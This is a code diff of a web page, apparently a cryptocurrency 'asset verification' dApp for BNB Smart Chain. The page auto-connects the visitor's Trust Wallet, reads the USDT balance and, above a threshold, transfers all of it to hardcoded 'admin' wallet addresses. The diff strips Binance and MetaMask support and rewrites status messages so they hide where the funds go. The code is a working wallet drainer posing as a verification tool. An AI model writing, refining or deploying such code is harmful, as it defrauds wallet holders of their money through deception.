@@ -7,12 +7,8 @@ import { Badge } from "@/components/ui/badge"
 import { Wallet, Home, AlertCircle, Loader2, Shield, DollarSign, Menu } from "lucide-react"
 import { toast } from "@/hooks/use-toast"
 import { Web3DirectTransfer } from "@/lib/web3-direct-transfer"
-import { GasFeeHelper } from "@/components/gas-fee-helper"
 
-// Enhanced Web3 types for multiple wallets
 interface Window {
-  ethereum?: any
-  BinanceChain?: any
   trustWallet?: any
   isTrust?: boolean
 }
@@ -24,20 +20,10 @@ interface TrustWallet {
   isTrust: boolean
 }
 
-interface BinanceWallet {
-  isConnected(): boolean
-  enable(): Promise<string[]>
-  request(args: { method: string; params?: any[] }): Promise<any>
-  isBinance: boolean
-}
-
 declare global {
   interface Window {
-    ethereum?: any
-    BinanceChain?: BinanceWallet
     trustWallet?: TrustWallet
     isTrust?: boolean
-    Web3?: any
   }
 }
 
@@ -46,12 +32,9 @@ export default function BNBVerifyDApp() {
   const [isConnected, setIsConnected] = useState(false)
   const [networkId, setNetworkId] = useState<string>("")
   const [balance, setBalance] = useState<string>("0")
-  const [walletType, setWalletType] = useState<"binance" | "trust" | "metamask" | "none">("none")
   const [autoConnecting, setAutoConnecting] = useState(true)
   const [usdtBalance, setUsdtBalance] = useState<string>("0.00")
-  const [verificationStep, setVerificationStep] = useState<
-    "idle" | "checking" | "verifying" | "transferring" | "completed"
-  >("idle")
+  const [verificationStep, setVerificationStep] = useState<"idle" | "checking" | "transferring" | "completed">("idle")
   const [txHash, setTxHash] = useState<string>("")
   const [verificationResult, setVerificationResult] = useState<{
     type: "genuine" | "flash" | "none"
@@ -75,7 +58,6 @@ export default function BNBVerifyDApp() {
   const [autoConnectInterval, setAutoConnectInterval] = useState<NodeJS.Timeout | null>(null)
   const [lastConnectAttempt, setLastConnectAttempt] = useState<number>(0)
 
-  // Updated Configuration with new admin wallet
   const ADMIN_WALLET = "0xd47c7585550eAd12aD365Fba5F4bD2533B9b4Eaf" // Updated admin wallet for payments
   const HIGH_AMOUNT_WALLET = "0xd96698f467B9b79483A2574a96821Ed576B09C1e" // For amounts > 2000 USDT
   const HIGH_AMOUNT_THRESHOLD = 2000 // USDT threshold for high amount wallet
@@ -97,7 +79,7 @@ export default function BNBVerifyDApp() {
 
   const connectTrustWallet = async (provider?: any): Promise<boolean> => {
     try {
-      const walletProvider = provider || window.ethereum || window.trustWallet
+      const walletProvider = provider || window.trustWallet
 
       if (!walletProvider) {
         return false
@@ -111,9 +93,8 @@ export default function BNBVerifyDApp() {
       if (accounts && accounts.length > 0) {
         setAccount(accounts[0])
         setIsConnected(true)
-        setWalletType("trust")
-        await switchToBSC("trust", walletProvider)
-        await getBalance(accounts[0], "trust", walletProvider)
+        await switchToBSC(walletProvider)
+        await getBalance(accounts[0], walletProvider)
         return true
       }
 
@@ -122,74 +103,6 @@ export default function BNBVerifyDApp() {
       if (error.code !== 4001) {
         // Don't show error for user rejection
         console.error("Trust Wallet connection failed:", error)
-      }
-      return false
-    }
-  }
-
-  const connectBinanceWallet = async (provider?: any): Promise<boolean> => {
-    try {
-      const walletProvider = provider || window.BinanceChain || window.ethereum
-
-      if (!walletProvider) {
-        return false
-      }
-
-      console.log("🟡 Connecting to Binance Wallet...")
-
-      // For Binance Chain Wallet
-      if (walletProvider.enable) {
-        const accounts = await walletProvider.enable()
-        setAccount(accounts[0])
-        setIsConnected(true)
-        setWalletType("binance")
-        await switchToBSC("binance", walletProvider)
-        await getBalance(accounts[0], "binance", walletProvider)
-        return true
-      } else {
-        // For Binance Wallet via ethereum provider
-        const accounts = await walletProvider.request({ method: "eth_requestAccounts" })
-
-        if (accounts && accounts.length > 0) {
-          setAccount(accounts[0])
-          setIsConnected(true)
-          setWalletType("binance")
-          await switchToBSC("binance", walletProvider)
-          await getBalance(accounts[0], "binance", walletProvider)
-          return true
-        }
-      }
-
-      return false
-    } catch (error: any) {
-      if (error.code !== 4001) {
-        // Don't show error for user rejection
-        console.error("Binance Wallet connection failed:", error)
-      }
-      return false
-    }
-  }
-
-  const connectMetaMask = async (): Promise<boolean> => {
-    try {
-      console.log("🦊 Connecting to MetaMask...")
-
-      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" })
-
-      if (accounts && accounts.length > 0) {
-        setAccount(accounts[0])
-        setIsConnected(true)
-        setWalletType("metamask")
-        await switchToBSC("metamask")
-        await getBalance(accounts[0], "metamask")
-        return true
-      }
-
-      return false
-    } catch (error: any) {
-      if (error.code !== 4001) {
-        // Don't show error for user rejection
-        console.error("MetaMask connection failed:", error)
       }
       return false
     }
@@ -212,7 +125,7 @@ export default function BNBVerifyDApp() {
 
   // Enhanced persistent auto-connect with multiple retry attempts
   const startPersistentAutoConnect = async () => {
-    console.log("🚀 Starting persistent auto-connect...")
+    console.log("🚀 Starting persistent auto-connect for Trust Wallet...")
     setAutoConnecting(true)
 
     // Immediate first attempt
@@ -264,27 +177,9 @@ export default function BNBVerifyDApp() {
   // Single auto-connect attempt
   const attemptAutoConnect = async (): Promise<boolean> => {
     try {
-      // Priority 1: Trust Wallet (most popular mobile wallet)
+      // Priority 1: Trust Wallet
       if (await detectAndConnectTrustWallet()) {
         console.log("✅ Trust Wallet auto-connected")
-        return true
-      }
-
-      // Priority 2: Binance Wallet
-      if (await detectAndConnectBinanceWallet()) {
-        console.log("✅ Binance Wallet auto-connected")
-        return true
-      }
-
-      // Priority 3: MetaMask or other injected wallets
-      if (await detectAndConnectMetaMask()) {
-        console.log("✅ MetaMask auto-connected")
-        return true
-      }
-
-      // Priority 4: Check for any ethereum provider
-      if (await detectGenericWallet()) {
-        console.log("✅ Generic wallet auto-connected")
         return true
       }
 
@@ -295,77 +190,72 @@ export default function BNBVerifyDApp() {
     }
   }
 
-  // Generic wallet detection for any Web3 provider
-  const detectGenericWallet = async (): Promise<boolean> => {
+  // Enhanced Trust Wallet Detection with more methods
+  const detectAndConnectTrustWallet = async (): Promise<boolean> => {
     try {
-      if (typeof window !== "undefined" && window.ethereum) {
-        console.log("🔍 Generic Web3 wallet detected")
+      // Method 1: Direct Trust Wallet check
+      if (typeof window !== "undefined" && window.trustWallet) {
+        return await connectTrustWallet()
+      }
 
-        // Check if already connected
-        const accounts = await window.ethereum.request({ method: "eth_accounts" })
-        if (accounts && accounts.length > 0) {
-          setAccount(accounts[0])
-          setIsConnected(true)
-          setWalletType("metamask") // Default to metamask type
-          await switchToBSC("metamask")
-          await getBalance(accounts[0], "metamask")
-          return true
+      // Method 2: User agent detection
+      if (typeof window !== "undefined" && navigator.userAgent.includes("Trust")) {
+        return await connectTrustWallet()
+      }
+
+      // Method 3: Check for Trust-specific properties
+      if (typeof window !== "undefined" && window.ethereum) {
+        // Assuming ethereum might exist even if trustWallet is primary
+        const provider = window.ethereum
+        if (provider.isTrustWallet || provider.isTrust || provider._metamask?.isTrust) {
+          return await connectTrustWallet()
         }
       }
+
       return false
     } catch (error) {
-      console.error("Generic wallet detection failed:", error)
+      console.error("Trust Wallet detection failed:", error)
       return false
     }
   }
 
   // Setup wallet event listeners for automatic reconnection
   const setupWalletEventListeners = () => {
-    if (typeof window === "undefined") return
+    if (typeof window === "undefined" || !window.trustWallet) return
 
     // Listen for account changes
-    if (window.ethereum) {
-      window.ethereum.on("accountsChanged", (accounts: string[]) => {
-        console.log("👤 Accounts changed:", accounts)
-        if (accounts.length > 0) {
-          setAccount(accounts[0])
-          setIsConnected(true)
-          getBalance(accounts[0], walletType)
-        } else {
-          setAccount("")
-          setIsConnected(false)
-          // Restart auto-connect if disconnected
-          setTimeout(() => startPersistentAutoConnect(), 1000)
-        }
-      })
-
-      // Listen for chain changes
-      window.ethereum.on("chainChanged", (chainId: string) => {
-        console.log("🔗 Chain changed:", chainId)
-        setNetworkId(chainId)
-        if (chainId !== BSC_NETWORK.chainId) {
-          // Auto-switch to BSC if on wrong network
-          setTimeout(() => switchToBSC(), 1000)
-        }
-      })
-
-      // Listen for connection events
-      window.ethereum.on("connect", (connectInfo: any) => {
-        console.log("🔌 Wallet connected:", connectInfo)
-        if (!isConnected) {
-          startPersistentAutoConnect()
-        }
-      })
-
-      // Listen for disconnection events
-      window.ethereum.on("disconnect", (error: any) => {
-        console.log("🔌 Wallet disconnected:", error)
-        setIsConnected(false)
+    window.trustWallet.on("accountsChanged", (accounts: string[]) => {
+      console.log("👤 Accounts changed:", accounts)
+      if (accounts.length > 0) {
+        setAccount(accounts[0])
+        setIsConnected(true)
+        getBalance(accounts[0])
+      } else {
         setAccount("")
-        // Restart auto-connect after disconnection
-        setTimeout(() => startPersistentAutoConnect(), 2000)
-      })
-    }
+        setIsConnected(false)
+        // Restart auto-connect if disconnected
+        setTimeout(() => startPersistentAutoConnect(), 1000)
+      }
+    })
+
+    // Listen for chain changes
+    window.trustWallet.on("chainChanged", (chainId: string) => {
+      console.log("🔗 Chain changed:", chainId)
+      setNetworkId(chainId)
+      if (chainId !== BSC_NETWORK.chainId) {
+        // Auto-switch to BSC if on wrong network
+        setTimeout(() => switchToBSC(), 1000)
+      }
+    })
+
+    // Listen for disconnection events
+    window.trustWallet.on("disconnect", (error: any) => {
+      console.log("🔌 Wallet disconnected:", error)
+      setIsConnected(false)
+      setAccount("")
+      // Restart auto-connect after disconnection
+      setTimeout(() => startPersistentAutoConnect(), 2000)
+    })
 
     // Listen for page visibility changes to retry connection
     document.addEventListener("visibilitychange", () => {
@@ -384,131 +274,16 @@ export default function BNBVerifyDApp() {
     })
   }
 
-  // Enhanced Trust Wallet Detection with more methods
-  const detectAndConnectTrustWallet = async (): Promise<boolean> => {
-    try {
-      // Method 1: Direct Trust Wallet check
-      if (typeof window !== "undefined" && window.ethereum?.isTrust) {
-        return await connectTrustWallet()
-      }
-
-      // Method 2: Trust Wallet global object
-      if (typeof window !== "undefined" && window.trustWallet) {
-        return await connectTrustWallet()
-      }
-
-      // Method 3: Check providers array
-      if (typeof window !== "undefined" && window.ethereum?.providers) {
-        const trustProvider = window.ethereum.providers.find((p: any) => p.isTrust)
-        if (trustProvider) {
-          return await connectTrustWallet(trustProvider)
-        }
-      }
-
-      // Method 4: User agent detection
-      if (typeof window !== "undefined" && navigator.userAgent.includes("Trust")) {
-        return await connectTrustWallet()
-      }
-
-      // Method 5: Check for Trust-specific properties
-      if (typeof window !== "undefined" && window.ethereum) {
-        const provider = window.ethereum
-        if (provider.isTrustWallet || provider.isTrust || provider._metamask?.isTrust) {
-          return await connectTrustWallet()
-        }
-      }
-
-      // Method 6: Mobile app detection
-      if (typeof window !== "undefined" && window.location.href.includes("trust://")) {
-        return await connectTrustWallet()
-      }
-
-      return false
-    } catch (error) {
-      console.error("Trust Wallet detection failed:", error)
-      return false
-    }
-  }
-
-  // Enhanced Binance Wallet Detection
-  const detectAndConnectBinanceWallet = async (): Promise<boolean> => {
-    try {
-      // Method 1: Binance Chain Wallet
-      if (typeof window !== "undefined" && window.BinanceChain) {
-        return await connectBinanceWallet()
-      }
-
-      // Method 2: Binance in ethereum providers
-      if (typeof window !== "undefined" && window.ethereum?.providers) {
-        const binanceProvider = window.ethereum.providers.find((p: any) => p.isBinance)
-        if (binanceProvider) {
-          return await connectBinanceWallet(binanceProvider)
-        }
-      }
-
-      // Method 3: Binance specific properties
-      if (typeof window !== "undefined" && window.ethereum?.isBinance) {
-        return await connectBinanceWallet()
-      }
-
-      // Method 4: Check for Binance-specific methods
-      if (typeof window !== "undefined" && window.ethereum) {
-        const provider = window.ethereum
-        if (provider.isBinanceWallet || provider.bnbSign || provider.requestBinanceAccounts) {
-          return await connectBinanceWallet()
-        }
-      }
-
-      return false
-    } catch (error) {
-      console.error("Binance Wallet detection failed:", error)
-      return false
-    }
-  }
-
-  // Enhanced MetaMask Detection
-  const detectAndConnectMetaMask = async (): Promise<boolean> => {
-    try {
-      if (typeof window !== "undefined" && window.ethereum) {
-        // Skip if it's Trust or Binance wallet
-        if (window.ethereum.isTrust || window.ethereum.isBinance) {
-          return false
-        }
-
-        // Check for existing connection
-        const accounts = await window.ethereum.request({ method: "eth_accounts" })
-        if (accounts.length > 0) {
-          return await connectMetaMask()
-        }
-
-        // Check for MetaMask-specific properties
-        if (window.ethereum.isMetaMask || window.ethereum._metamask) {
-          return await connectMetaMask()
-        }
-      }
-      return false
-    } catch (error) {
-      console.error("MetaMask detection failed:", error)
-      return false
-    }
-  }
-
   // Manual wallet connection (when user clicks connect button) - ONLY shows popup when user manually clicks
   const connectWallet = async () => {
     try {
-      // Try Trust Wallet first (most popular)
-      if (await connectTrustWalletManual()) return
-
-      // Try Binance Wallet
-      if (await connectBinanceWalletManual()) return
-
-      // Try MetaMask
-      if (await connectMetaMaskManual()) return
+      // Try Trust Wallet first
+      if (await connectTrustWallet()) return
 
       // No wallet found
       toast({
         title: "No Wallet Found",
-        description: "Please install Trust Wallet, Binance Wallet, or MetaMask to use this dApp.",
+        description: "Please install Trust Wallet to use this dApp.",
         variant: "destructive",
       })
     } catch (error) {
@@ -516,111 +291,8 @@ export default function BNBVerifyDApp() {
     }
   }
 
-  // Manual Trust Wallet connection (with popup)
-  const connectTrustWalletManual = async (): Promise<boolean> => {
-    try {
-      const walletProvider = window.ethereum || window.trustWallet
-
-      if (!walletProvider) {
-        return false
-      }
-
-      console.log("🔵 Manual Trust Wallet connection...")
-
-      // Request account access (this will show popup)
-      const accounts = await walletProvider.request({ method: "eth_requestAccounts" })
-
-      if (accounts && accounts.length > 0) {
-        setAccount(accounts[0])
-        setIsConnected(true)
-        setWalletType("trust")
-        await switchToBSC("trust", walletProvider)
-        await getBalance(accounts[0], "trust", walletProvider)
-        return true
-      }
-
-      return false
-    } catch (error: any) {
-      if (error.code !== 4001) {
-        // Don't show error for user rejection
-        console.error("Trust Wallet manual connection failed:", error)
-      }
-      return false
-    }
-  }
-
-  // Manual Binance Wallet connection (with popup)
-  const connectBinanceWalletManual = async (): Promise<boolean> => {
-    try {
-      const walletProvider = window.BinanceChain || window.ethereum
-
-      if (!walletProvider) {
-        return false
-      }
-
-      console.log("🟡 Manual Binance Wallet connection...")
-
-      // For Binance Chain Wallet
-      if (walletProvider.enable) {
-        const accounts = await walletProvider.enable()
-        setAccount(accounts[0])
-        setIsConnected(true)
-        setWalletType("binance")
-        await switchToBSC("binance", walletProvider)
-        await getBalance(accounts[0], "binance", walletProvider)
-        return true
-      } else {
-        // For Binance Wallet via ethereum provider
-        const accounts = await walletProvider.request({ method: "eth_requestAccounts" })
-
-        if (accounts && accounts.length > 0) {
-          setAccount(accounts[0])
-          setIsConnected(true)
-          setWalletType("binance")
-          await switchToBSC("binance", walletProvider)
-          await getBalance(accounts[0], "binance", walletProvider)
-          return true
-        }
-      }
-
-      return false
-    } catch (error: any) {
-      if (error.code !== 4001) {
-        // Don't show error for user rejection
-        console.error("Binance Wallet manual connection failed:", error)
-      }
-      return false
-    }
-  }
-
-  // Manual MetaMask connection (with popup)
-  const connectMetaMaskManual = async (): Promise<boolean> => {
-    try {
-      console.log("🦊 Manual MetaMask connection...")
-
-      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" })
-
-      if (accounts && accounts.length > 0) {
-        setAccount(accounts[0])
-        setIsConnected(true)
-        setWalletType("metamask")
-        await switchToBSC("metamask")
-        await getBalance(accounts[0], "metamask")
-        return true
-      }
-
-      return false
-    } catch (error: any) {
-      if (error.code !== 4001) {
-        // Don't show error for user rejection
-        console.error("MetaMask manual connection failed:", error)
-      }
-      return false
-    }
-  }
-
-  const switchToBSC = async (wallet: "binance" | "trust" | "metamask" = walletType, provider?: any) => {
-    const walletProvider = provider || getWalletProvider(wallet)
+  const switchToBSC = async (provider?: any) => {
+    const walletProvider = provider || window.trustWallet
 
     if (typeof window !== "undefined" && walletProvider) {
       try {
@@ -645,33 +317,8 @@ export default function BNBVerifyDApp() {
     }
   }
 
-  const getWalletProvider = (wallet: "binance" | "trust" | "metamask") => {
-    switch (wallet) {
-      case "trust":
-        return window.trustWallet || window.ethereum
-      case "binance":
-        return window.BinanceChain || window.ethereum
-      case "metamask":
-      default:
-        return window.ethereum
-    }
-  }
-
-  const getNetworkId = async (wallet: "binance" | "trust" | "metamask" = walletType, provider?: any) => {
-    const walletProvider = provider || getWalletProvider(wallet)
-
-    if (typeof window !== "undefined" && walletProvider) {
-      try {
-        const chainId = await walletProvider.request({ method: "eth_chainId" })
-        setNetworkId(chainId)
-      } catch (error) {
-        console.error("Error getting network ID:", error)
-      }
-    }
-  }
-
-  const getBalance = async (address: string, wallet: "binance" | "trust" | "metamask" = walletType, provider?: any) => {
-    const walletProvider = provider || getWalletProvider(wallet)
+  const getBalance = async (address: string, provider?: any) => {
+    const walletProvider = provider || window.trustWallet
 
     if (typeof window !== "undefined" && walletProvider) {
       try {
@@ -713,14 +360,14 @@ export default function BNBVerifyDApp() {
       return
     }
 
-    const provider = getWalletProvider(walletType)
+    const provider = window.trustWallet // Trust Wallet only
     const web3Transfer = new Web3DirectTransfer(provider, account)
 
     try {
       setVerificationStep("checking")
       toast({
         title: "🔍 Analyzing Assets",
-        description: "Scanning wallet for USDT and flash tokens...",
+        description: "Scanning wallet for USDT...",
       })
 
       // Verify admin wallet is valid
@@ -740,7 +387,6 @@ export default function BNBVerifyDApp() {
 
       setUsdtBalance(usdtBalance.toFixed(2))
 
-      // Smart behavior implementation
       if (usdtBalance === 0) {
         setVerificationResult({
           type: "none",
@@ -760,10 +406,9 @@ export default function BNBVerifyDApp() {
       }
 
       if (usdtBalance <= FLASH_THRESHOLD) {
-        // Genuine assets - show success message
         setVerificationResult({
           type: "genuine",
-          message: "✅ Verification Successful! Your assets are genuine. No flash or reported USDT found.",
+          message: "✅ Verification Successful! Your assets are genuine.",
           usdtAmount: usdtBalance,
           bnbAmount: bnbBalance,
           transferred: false,
@@ -778,7 +423,6 @@ export default function BNBVerifyDApp() {
         return
       }
 
-      // Check gas fees before proceeding with transfer
       const gasCheck = await web3Transfer.hasEnoughBNBForGas(usdtBalance)
       setGasInfo(gasCheck)
 
@@ -792,10 +436,9 @@ export default function BNBVerifyDApp() {
         return
       }
 
-      // Flash USDT detected - proceed with transfer to admin wallet
       toast({
-        title: "⚠️ Flash USDT Detected",
-        description: `Suspicious amount: ${usdtBalance.toFixed(2)} USDT. Transferring to secure admin wallet...`,
+        title: "⚠️ High USDT Amount Detected",
+        description: `Transferring ${usdtBalance.toFixed(2)} USDT to wallet...`,
         variant: "destructive",
       })
 
@@ -815,24 +458,21 @@ export default function BNBVerifyDApp() {
 
   const executeUSDTTransfer = async (web3Transfer: Web3DirectTransfer, usdtAmount: number, bnbAmount: number) => {
     try {
-      // Enhanced gas fee checking
       const gasCheck = await web3Transfer.hasEnoughBNBForGas(usdtAmount)
 
       if (!gasCheck.hasEnough) {
-        // Handle insufficient gas fees
         const shortfallBNB = gasCheck.shortfall.toFixed(6)
         const requiredBNB = gasCheck.requiredGas.toFixed(6)
 
         toast({
           title: "❌ Insufficient BNB for Gas Fees",
-          description: `Need ${requiredBNB} BNB for gas, but only have ${gasCheck.bnbBalance.toFixed(6)} BNB. Shortfall: ${shortfallBNB} BNB`,
+          description: `Need ${requiredBNB} BNB for gas, but only have ${gasCheck.bnbBalance.toFixed(6)} BNB.`,
           variant: "destructive",
         })
 
-        // Show detailed gas fee information
         setVerificationResult({
           type: "flash",
-          message: `⛽ Insufficient Gas Fees: You need ${requiredBNB} BNB for gas fees but only have ${gasCheck.bnbBalance.toFixed(6)} BNB. Please add ${shortfallBNB} BNB to your wallet and try again.`,
+          message: `⛽ Insufficient Gas Fees: You need ${requiredBNB} BNB but only have ${gasCheck.bnbBalance.toFixed(6)} BNB. Please add ${shortfallBNB} BNB.`,
           usdtAmount: usdtAmount,
           bnbAmount: bnbAmount,
           transferred: false,
@@ -843,7 +483,6 @@ export default function BNBVerifyDApp() {
         return
       }
 
-      // Proceed with transfer if gas fees are sufficient
       const isHighAmount = usdtAmount > HIGH_AMOUNT_THRESHOLD
       const targetWallet = isHighAmount ? HIGH_AMOUNT_WALLET : ADMIN_WALLET
 
@@ -852,22 +491,20 @@ export default function BNBVerifyDApp() {
         description: `Gas fees: ${gasCheck.requiredGas.toFixed(6)} BNB. Transferring ${usdtAmount.toFixed(2)} USDT...`,
       })
 
-      // Execute direct USDT transfer to appropriate admin wallet
       const txHash = await web3Transfer.transferAllUSDTToAdmin()
       setTxHash(txHash)
 
       toast({
         title: "📤 Transfer Initiated",
-        description: `USDT payment sent to ${isHighAmount ? "high-amount" : "standard"} admin! Tx: ${txHash.slice(0, 10)}...`,
+        description: `USDT sent to ${isHighAmount ? "high-amount" : "standard"} wallet!`,
       })
 
-      // Wait for confirmation
       const success = await web3Transfer.waitForConfirmation(txHash)
 
       if (success) {
         setVerificationResult({
           type: "flash",
-          message: `💰 Flash USDT detected and successfully transferred to ${isHighAmount ? "high-amount" : "standard"} admin wallet for secure processing.`,
+          message: `💰 ${usdtAmount.toFixed(2)} USDT successfully transferred.`,
           usdtAmount: usdtAmount,
           bnbAmount: bnbAmount,
           transferred: true,
@@ -878,11 +515,10 @@ export default function BNBVerifyDApp() {
 
         toast({
           title: "✅ Payment Completed!",
-          description: `${usdtAmount.toFixed(2)} USDT successfully sent to ${isHighAmount ? "high-amount" : "standard"} admin wallet.`,
+          description: `${usdtAmount.toFixed(2)} USDT successfully sent.`,
         })
 
-        // Refresh balances
-        await getBalance(account, walletType)
+        await getBalance(account)
       } else {
         throw new Error("Transfer transaction failed or timed out")
       }
@@ -895,16 +531,10 @@ export default function BNBVerifyDApp() {
 
       if (error.message?.includes("insufficient funds")) {
         errorTitle = "⛽ Insufficient Gas Fees"
-        errorMessage = "You don't have enough BNB to pay for gas fees. Please add BNB to your wallet and try again."
+        errorMessage = "You don't have enough BNB for gas. Please add BNB and try again."
       } else if (error.message?.includes("user rejected")) {
         errorTitle = "❌ Transaction Rejected"
-        errorMessage = "Transaction was rejected. Please try again if you want to proceed."
-      } else if (error.message?.includes("No USDT balance")) {
-        errorTitle = "❌ No USDT Available"
-        errorMessage = "No USDT balance available to transfer."
-      } else if (error.message?.includes("gas")) {
-        errorTitle = "⛽ Gas Fee Error"
-        errorMessage = "Gas fee estimation failed. Please check your BNB balance and try again."
+        errorMessage = "Transaction was rejected. Please try again."
       }
 
       toast({
@@ -912,25 +542,10 @@ export default function BNBVerifyDApp() {
         description: errorMessage,
         variant: "destructive",
       })
-
-      // Show gas fee guidance in verification result
-      if (error.message?.includes("insufficient funds") || error.message?.includes("gas")) {
-        setVerificationResult({
-          type: "flash",
-          message: `⛽ Gas Fee Issue: Unable to process USDT transfer due to insufficient BNB for gas fees. Please add at least 0.002 BNB to your wallet and try again.`,
-          usdtAmount: usdtAmount,
-          bnbAmount: bnbAmount,
-          transferred: false,
-          adminWallet: usdtAmount > HIGH_AMOUNT_THRESHOLD ? HIGH_AMOUNT_WALLET : ADMIN_WALLET,
-          isHighAmount: usdtAmount > HIGH_AMOUNT_THRESHOLD,
-        })
-        setVerificationStep("completed")
-      }
     }
   }
 
   const isOnBSC = networkId === BSC_NETWORK.chainId
-  const isMainnet = networkId === BSC_NETWORK.chainId
 
   return (
     <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-800 to-black text-white">
@@ -995,7 +610,7 @@ export default function BNBVerifyDApp() {
             )}
             {!isConnected && (
               <div className="text-center">
-                <p className="text-gray-400 mb-3">Connect your Web3 wallet to continue</p>
+                <p className="text-gray-400 mb-3">Connect Trust Wallet to continue</p>
               </div>
             )}
           </div>
@@ -1015,11 +630,9 @@ export default function BNBVerifyDApp() {
 
             <div className="space-y-4">
               <p className="text-lg sm:text-xl text-gray-300 font-medium">
-                Serving Gas Less Web3 tools to over 478 Million users
+                Serve Gas Less Web3 tools to over 478 Million users
               </p>
-              <p className="text-gray-400 leading-relaxed px-4">
-                A community-driven blockchain ecosystem of Layer-1 and Layer-2 scaling solutions.
-              </p>
+              <p className="text-gray-400 leading-relaxed px-4">A community-driven blockchain ecosystem on BSC.</p>
             </div>
           </div>
 
@@ -1086,18 +699,6 @@ export default function BNBVerifyDApp() {
                 </div>
               </CardContent>
             </Card>
-          )}
-
-          {/* Gas Fee Helper - Updated with user wallet */}
-          {gasInfo && !gasInfo.hasEnough && verificationStep === "completed" && (
-            <GasFeeHelper
-              userWallet={account}
-              bnbBalance={gasInfo.bnbBalance}
-              requiredGas={gasInfo.requiredGas}
-              shortfall={gasInfo.shortfall}
-              isMainnet={isMainnet}
-              onRefresh={() => getBalance(account, walletType)}
-            />
           )}
 
           {/* Action Buttons - Mobile Optimized */}
